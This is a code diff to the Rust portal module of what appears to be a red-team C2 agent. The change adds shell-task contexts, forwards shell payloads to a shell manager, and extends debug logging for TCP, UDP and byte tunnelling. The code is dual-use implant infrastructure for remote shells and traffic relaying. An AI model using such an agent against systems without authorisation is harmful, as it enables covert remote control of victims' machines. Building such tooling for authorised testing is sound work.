@@ -1,5 +1,6 @@
 use anyhow::Result;
-use pb::c2::{CreatePortalRequest, CreatePortalResponse, TaskContext};
+use eldritch_agent::Context;
+use pb::c2::{CreatePortalRequest, CreatePortalResponse, create_portal_request};
 use pb::portal::{BytesPayloadKind, Mote, mote::Payload};
 use pb::trace::{TraceData, TraceEvent, TraceEventKind};
 use portal_stream::{OrderedReader, PayloadSequencer};
@@ -8,6 +9,8 @@ use std::collections::HashMap;
 use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::sync::mpsc;
 use transport::Transport;
+
+use crate::shell::manager::ShellManagerMessage;
 
 use super::{bytes, tcp, udp};
 
@@ -18,19 +21,22 @@ struct StreamContext {
 }
 
 pub async fn run<T: Transport + Send + Sync + 'static>(
-    task_context: TaskContext,
+    context: Context,
     mut transport: T,
+    shell_manager_tx: mpsc::Sender<ShellManagerMessage>,
 ) -> Result<()> {
     let (req_tx, req_rx) = mpsc::channel::<CreatePortalRequest>(100);
     let (resp_tx, mut resp_rx) = mpsc::channel::<CreatePortalResponse>(100);
 
     // Start transport loop
-    // Note: We use a separate task for transport since it might block or be long-running
+    // Note: We use a separate task for transport since it might be long-running
     let transport_handle = tokio::spawn(async move {
-        if let Err(e) = transport.create_portal(req_rx, resp_tx).await {
+        if let Err(_e) = transport.create_portal(req_rx, resp_tx).await {
             #[cfg(debug_assertions)]
-            log::error!("Portal transport error: {}", e);
+            log::error!("Portal transport error: {}", _e);
         }
+        #[cfg(debug_assertions)]
+        log::info!("Portal transport loop exited");
     });
 
     // Map of stream_id -> StreamContext
@@ -43,15 +49,23 @@ pub async fn run<T: Transport + Send + Sync + 'static>(
     // Channel for handler tasks to send outgoing motes back to main loop
     let (out_tx, mut out_rx) = mpsc::channel::<Mote>(100);
 
+    let context_val = match &context {
+        Context::Task(tc) => Some(create_portal_request::Context::TaskContext(tc.clone())),
+        Context::ShellTask(stc) => Some(create_portal_request::Context::ShellTaskContext(
+            stc.clone(),
+        )),
+    };
+
     // Send initial registration message
-    if req_tx
+    if let Err(_e) = req_tx
         .send(CreatePortalRequest {
-            context: Some(task_context.clone()),
+            context: context_val.clone(),
             mote: None,
         })
         .await
-        .is_err()
     {
+        #[cfg(debug_assertions)]
+        log::error!("Failed to send initial portal registration: {}", _e);
         return Err(anyhow::anyhow!(
             "Failed to send initial portal registration"
         ));
@@ -65,14 +79,16 @@ pub async fn run<T: Transport + Send + Sync + 'static>(
                     Some(resp) => {
                          #[allow(clippy::collapsible_if)]
                          if let Some(mote) = resp.mote {
-                            if let Err(e) = handle_incoming_mote(mote, &mut streams, &out_tx, &mut tasks).await {
+                            if let Err(_e) = handle_incoming_mote(mote, &mut streams, &out_tx, &mut tasks, &shell_manager_tx).await {
                                 #[cfg(debug_assertions)]
-                                log::error!("Error handling incoming mote: {}", e);
+                                log::error!("Error handling incoming mote: {}", _e);
                             }
                          }
                     }
                     None => {
                         // Transport closed
+                        #[cfg(debug_assertions)]
+                        log::info!("Transport channel closed (resp_rx), shutting down portal loop");
                         break;
                     }
                 }
@@ -82,15 +98,25 @@ pub async fn run<T: Transport + Send + Sync + 'static>(
             msg = out_rx.recv() => {
                 match msg {
                     Some(mote) => {
+                        let context_val = match &context {
+                            Context::Task(tc) => Some(create_portal_request::Context::TaskContext(tc.clone())),
+                            Context::ShellTask(stc) => {
+                                Some(create_portal_request::Context::ShellTaskContext(stc.clone()))
+                            }
+                        };
                         let req = CreatePortalRequest {
-                            context: Some(task_context.clone()),
+                            context: context_val,
                             mote: Some(mote),
                         };
-                        if req_tx.send(req).await.is_err() {
+                        if let Err(_e) = req_tx.send(req).await {
+                            #[cfg(debug_assertions)]
+                            log::error!("Failed to send outgoing mote to transport: {}", _e);
                             break;
                         }
                     }
                     None => {
+                        #[cfg(debug_assertions)]
+                        log::info!("Outgoing mote channel (out_rx) closed");
                         break; // All handlers closed? Unlikely.
                     }
                 }
@@ -112,11 +138,15 @@ async fn handle_incoming_mote(
     streams: &mut HashMap<String, StreamContext>,
     out_tx: &mpsc::Sender<Mote>,
     tasks: &mut Vec<tokio::task::JoinHandle<()>>,
+    shell_manager_tx: &mpsc::Sender<ShellManagerMessage>,
 ) -> Result<()> {
     // Handle Trace Mote
     if let Some(Payload::Bytes(ref mut bytes_payload)) = mote.payload
         && bytes_payload.kind == BytesPayloadKind::Trace as i32
     {
+        #[cfg(debug_assertions)]
+        log::trace!("portal trace mote received: {:?}", &bytes_payload.clone());
+
         // 1. Add Agent Recv Event
         add_trace_event(&mut bytes_payload.data, TraceEventKind::AgentRecv)?;
 
@@ -131,12 +161,31 @@ async fn handle_incoming_mote(
         return Ok(());
     }
 
+    // Handle Shell Mote
+    let is_shell = matches!(mote.payload, Some(Payload::Shell(_)));
+    if is_shell {
+        let _ = shell_manager_tx.try_send(ShellManagerMessage::ProcessPortalPayload(
+            mote,
+            out_tx.clone(),
+        ));
+        return Ok(());
+    }
+
     let stream_id = mote.stream_id.clone();
 
     // Get or create context
     if !streams.contains_key(&stream_id) {
         #[cfg(debug_assertions)]
-        log::info!("incoming mote for new stream! {stream_id} {mote:?}");
+        {
+            let seq_id = mote.seq_id;
+            let size = mote.payload.as_ref().map_or(0, |p| match p {
+                Payload::Bytes(b) => b.data.len(),
+                Payload::Tcp(t) => t.data.len(),
+                Payload::Udp(u) => u.data.len(),
+                Payload::Shell(s) => s.input.len(),
+            });
+            log::info!("new portal stream {stream_id} seq={seq_id} size={size}");
+        }
 
         // Create new stream context
         let (tx, rx) = mpsc::channel::<Mote>(100);
@@ -149,10 +198,12 @@ async fn handle_incoming_mote(
         let stream_id_clone = stream_id.clone();
 
         let task = tokio::spawn(async move {
-            if let Err(e) = stream_handler(stream_id_clone, rx, out_tx_clone).await {
+            if let Err(_e) = stream_handler(stream_id_clone.clone(), rx, out_tx_clone).await {
                 #[cfg(debug_assertions)]
-                log::error!("Stream handler error: {}", e);
+                log::error!("Stream handler error for {}: {}", stream_id_clone, _e);
             }
+            #[cfg(debug_assertions)]
+            log::info!("Stream handler finished for {}", stream_id_clone);
         });
         tasks.push(task);
     }
@@ -218,8 +269,15 @@ async fn stream_handler(
             Payload::Tcp(_) => tcp::handle_tcp(first_mote, rx, out_tx, sequencer).await,
             Payload::Udp(_) => udp::handle_udp(first_mote, rx, out_tx, sequencer).await,
             Payload::Bytes(_) => bytes::handle_bytes(first_mote, rx, out_tx, sequencer).await,
+            Payload::Shell(_) => {
+                #[cfg(debug_assertions)]
+                log::warn!("Shell payloads should have been intercepted before stream handler");
+                Ok(())
+            }
         }
     } else {
+        #[cfg(debug_assertions)]
+        log::warn!("Received mote with no payload for stream {}", stream_id);
         Ok(())
     }
 }
